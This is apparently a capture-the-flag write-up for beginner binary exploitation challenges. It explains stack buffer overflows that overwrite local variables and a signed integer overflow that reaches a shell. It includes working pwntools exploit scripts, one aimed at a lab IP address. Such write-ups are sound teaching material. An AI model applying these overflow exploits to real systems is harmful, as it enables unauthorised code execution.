# PWN101

### Challenge 1
- The binary asks us what are the ingridents to make biriyani, based on our response it gives us a result.

![inital](images/chal1_initial.png)

- checksec on the binary, we can see that there are no canaries, so overflow can be done.

![checksec](images/chal1_checksec.png)

- As the binary is not stripped so we can see the code logic easily. When checking the main function we can see its checking if preset_value is 1337 if its not so we get shell.\
So the objective is to rewrite preset_value to something other than 1337. And we can also see that the size of the buffer.

![main](images/chal1_main_logic.png)

- Entering more characters than the input_buffer accepts will overwrite the preset_value.

![flag](images/chal1_flag.png)

### Challenge 2
- Interacting with the binary

![interact](images/chal2_initial.png)

- Checksec on the binary

![checksec](images/chal2_checksec.png)

- As we can see the binary is not stripped so we can see the logic without any problem. When inspecting the main logic we can see that two variables are assigned with some inital values, and then these are being comapred with other values, if these values matches then we get out shell.

![main](images/cha2_main_logic.png)

- This time user provided input is acquired using scanf() , which won't check the length of the string stored in var_70h.\
There are no canaries so we can use Buffer Overflow which can overwrite the variables.\
So we first need to write some dummy values so that we can reach the first variable, then 4 bytes (as the comparison happens in double word) in variable and next 4 bytes in the other variable.

- So the question is how many bytes do we pad before we actually reach the variable we need to overwrite. This is not that tough with general math we can do.
```
we know that we start writing at rbp - 0x70
and we write till rbp - 0x8,
in hex when we subtract this we get: 68 in hex, which is 104 in decimal
```
**Exploit**
```python
from pwn import *

context.binary = binary = './pwn102-1644307392479.pwn102'

# p32(0xc0ff33) = \x33\xff\xc0\x00 = this will convert to little endian and 4 bytes format
payload = b"A" * 0x68 + p32(0xc0d3) + p32(0xc0ff33)

# p = process()
p = remote("10.49.132.154", 9002)
p.recv()
p.sendline(payload)
p.interactive()
```

### Challenge 3

### Challenge 5
- Interacting with binary

![interacting](images/chal5_binary_interaction.png)

- Checksec on binary

![checksec](images/chal5_checksec.png)

- Main function after decompiling the binary.

![main](images/chal5_main.png)

- From the image we can see that we want to reach the else if case if we want to execute the "/bin/sh". This case is reached when the addition of both the inputs is less than 0.\
From first if case we can see that if either of the number is negative then the program will print `[o.O] Hmmm... that was a Good try!` and exit.\
So how can add two positive integers and then get a negative result. This is possible based on how the CPU interprets the number that we have provided.

- Here we are going to use the `Signed Integer Overflow` vulnerability, when we are dealing with signed integers which we are in this case, we need to see how they are represented in memory.\
When we have a negative number it will be represented using `2's complement` in memory. What happens in Signed Integer Overflow let's try to understand it using an example.

```
lets say we are dealing with an 8 bit signed numbers
the max that we can represent in 8 bit is 0111 1111: 127
And now we want to add 1 to this number.
As we are dealing with 8 bit numbers we cannot represent 128 here so the result of this addition will be -128
What happened is the leftmost bit is turned on when we added 1 to the 0111 1111
```
![explanation](images/chal5_integer_overflow_explanation.png)

- So the idea is to add the max number that we can represent in 32 bit signed integer with 1, this will overflow and the result will be a negative number, and we'll get the shell.

![local](images/chal5_local_exploit.png)

```python
from pwn import *

binary = context.binary = ELF("./pwn105-1644300421555.pwn105", checksec=False)

if args.REMOTE:
    p = remote("", 9005)
else:
    p = process(binary.path)

p.sendlineafter(b"]>>", b"2147483647")
p.sendlineafter(b"]>>", b"1")
p.interactive()
```
